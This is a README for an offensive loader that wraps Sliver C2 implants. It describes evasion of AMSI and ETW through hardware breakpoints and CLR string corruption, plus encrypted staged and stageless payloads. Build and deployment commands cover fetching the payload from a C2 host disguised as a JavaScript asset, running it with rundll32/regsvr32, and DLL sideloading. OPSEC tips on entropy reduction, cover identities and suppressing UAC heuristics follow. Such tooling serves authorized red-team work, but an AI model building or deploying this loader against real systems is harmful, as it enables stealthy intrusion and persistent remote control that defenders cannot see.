# SliverMirage

A fork of [CrystalSliver](https://github.com/licitrasimone/CrystalSliver), extending the Crystal Palace PICO loader with dual-layer AMSI bypass, ETW silencing, and six delivery variants for [Sliver C2](https://github.com/BishopFox/sliver).

## What it does

SliverMirage wraps a Sliver implant DLL through [Crystal Palace](https://tradecraftgarden.org/) PICO virtualization, then delivers it via a loader that defeats AMSI and ETW without patching `amsi.dll` or `ntdll.dll`.

**Evasion stack:**

| Layer | Technique | Detail |
|-------|-----------|--------|
| **AMSI L1** | CLR string corruption | `LdrRegisterDllNotification` intercepts `clr.dll` load, corrupts `AmsiScanBuffer` in `.rdata` before CLR calls `GetProcAddress` |
| **AMSI L2** | VEH + HWBP | Vectored Exception Handler on `AmsiScanBuffer` returns `E_INVALIDARG` |
| **ETW** | HWBP | DR1 on `NtTraceControl`, returns `STATUS_SUCCESS` |
| **Payload** | AES-256-CBC + XOR | BCrypt decryption, VirtualAlloc(RW) -> VirtualProtect(RX), zero RWX |
| **Virtualization** | Crystal Palace PICO | Sliver DLL runs inside a PICO process, invisible to userland AV |

## Variants

| Format | File | Delivery | C2 at runtime? |
|--------|------|----------|----------------|
| `exe` | Staged EXE | EXE + `payload.dat` on C2 website | Yes (HTTPS) |
| `exe-stageless` | Stageless EXE | Single EXE | No |
| `dll` | Stageless DLL | Single DLL | No |
| `dll-staged` | Staged DLL | DLL + `payload.dat` on C2 website | Yes (HTTPS) |
| `shellcode` | Staged shellcode | `.bin` + `payload.dat` | Yes (HTTPS) |
| `shellcode-stageless` | Stageless shellcode | Single `.bin` | No |

**Staged** variants download the encrypted PICO at runtime from a Sliver HTTPS website. The EXE/DLL is small (~20 KB) and carries no payload on disk.

**Stageless** variants embed the encrypted PICO at compile time (XOR + AES double-layer). Larger on disk but zero network activity before beacon callback.

## Quick start

### Prerequisites

- `x86_64-w64-mingw32-gcc` (mingw-w64)
- `nasm`
- `python3` with `pefile` (`pip install pefile`)
- `openssl`
- Java 17 (for Crystal Palace — auto-provisioned by `build.sh`)

### Build with build.sh (recommended)

The build script auto-provisions missing dependencies (including Crystal Palace and Java 17) and handles the full pipeline: DLL -> Crystal Palace PICO -> encrypt -> compile.

```bash
# Staged EXE (default)
./build.sh --dll /path/to/sliver_implant.dll --host 10.0.0.1

# Stageless EXE
./build.sh --dll /path/to/sliver_implant.dll --format exe-stageless

# Stageless DLL
./build.sh --dll /path/to/sliver_implant.dll --format dll

# Staged DLL
./build.sh --dll /path/to/sliver_implant.dll --format dll-staged --host 10.0.0.1

# Shellcode (staged)
./build.sh --dll /path/to/sliver_implant.dll --format shellcode --host 10.0.0.1

# Shellcode (stageless)
./build.sh --dll /path/to/sliver_implant.dll --format shellcode-stageless
```

Options:
- `--dll <path>` — Sliver implant DLL (required)
- `--host <ip>` — C2 server IP (required for staged formats)
- `--port <port>` — C2 port (default: 443)
- `--path <path>` — URL path for payload download (default: `/assets/js/vendor.js`)
- `--format <fmt>` — Output format (default: `exe`)
- `--export <name>` — Custom DLL export name

### Build with Make (manual)

If you already have a Crystal Palace PICO blob:

```bash
# Staged EXE
make PICO=/path/to/implant.crystal.bin C2_HOST=10.0.0.1

# Stageless EXE
make exe-stageless PICO=/path/to/implant.crystal.bin

# Stageless DLL
make dll PICO=/path/to/implant.crystal.bin

# All targets
make clean
```

## Deployment

### Staged (EXE or DLL)

1. Upload `build/payload.dat` to a Sliver HTTPS website:
   ```
   sliver > websites add-content --website cover \
     --web-path /assets/js/vendor.js \
     --content-type application/javascript \
     --content build/payload.dat
   ```

2. Deliver `build/csvchelper.exe` (or `.dll`) to the target.

### Stageless

Single file delivery. No C2 website setup needed.

### DLL execution methods

```
rundll32 csvchelper.dll,StartW
regsvr32 /s csvchelper.dll
```

Or use DLL sideloading (rename to match a legitimate DLL the target application loads).

**Exports:** `DllRegisterServer`, `DllUnregisterServer`, `StartW`, `VoidFunc`

## Project structure

```
SliverMirage/
  loader/                    # Crystal Palace PICO loader (from CrystalSliver)
    src/                     # Loader C sources + draugr ASM
    loader.spec              # Crystal Palace linker spec
    pico.spec                # PICO generation spec
  src/
    stager_remote.c          # Staged EXE
    stager_stageless.c       # Stageless EXE
    stager_remote_dll.c      # Staged DLL
    stager_stageless_dll.c   # Stageless DLL
    stager_debug.c           # Debug EXE (MessageBox diagnostics)
  scripts/
    gen_payload.py           # AES-256-CBC encrypt (staged)
    gen_payload_stageless.py # AES + XOR embed (stageless)
    dll_to_shellcode.py      # sRDI DLL-to-shellcode converter
  resources/
    resource.rc              # Version info (EXE)
    resource_dll.rc          # Version info (DLL)
    manifest.xml             # asInvoker manifest
  libtcg.x64.zip             # TCG library for Crystal Palace
  Makefile
  build.sh
```

## OPSEC notes

- **IAT is clean**: only `kernel32`, `advapi32`, `bcrypt` — all legitimate Windows APIs
- **No memory patches**: AMSI/ETW bypass uses hardware breakpoints, not `VirtualProtect` on system DLLs
- **No RWX**: payload memory goes RW -> RX, never RWX
- **GUI subsystem**: `WinMain` entry point, `-mwindows` — no console flash
- **Version info + manifest**: embedded `asInvoker` manifest suppresses UAC heuristics
- **Entropy control**: stageless payloads use XOR rolling key to reduce entropy from ~7.8 to ~6.0-6.5
- Customize `resource.rc` / `resource_dll.rc` with your cover identity before building

## Disclaimer

This project is intended for **authorized security testing, research, and educational purposes only**. Use it exclusively in environments where you have explicit written permission to conduct penetration testing. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse of this software.

## Credits

- [Crystal Palace](https://tradecraftgarden.org/) by Rasta Mouse — PICO virtualization engine
- [CrystalSliver](https://github.com/licitrasimone/CrystalSliver) — original Crystal Palace + Sliver integration
- [sRDI](https://github.com/monoxgas/sRDI) by Nick Landers — shellcode reflective DLL injection technique

## License

MIT
